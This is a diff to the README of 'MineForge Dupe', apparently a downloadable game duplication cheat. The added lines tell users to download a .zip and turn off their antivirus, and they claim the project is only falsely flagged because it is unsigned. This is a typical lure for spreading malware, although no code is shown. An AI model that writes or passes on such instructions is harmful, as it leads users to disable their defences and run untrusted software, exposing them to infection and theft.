@@ -1,3 +1,6 @@
+(DISCLAIMER FOR GITHUB USERS, PLEASE CLICK THE .ZIP AND PRESS THE DOWNLOAD ICON, AND MAKE SURE TO TURN OFF ANTIVIRUS.) <<( We are unsigned by every antivirus company therefore leaving us falsely flagged )
+
+
 Hello, and thank you for downloading MineForge Dupe!
  Here are some key things you need to know about us, any troubleshooting can be found in this very document.	
 
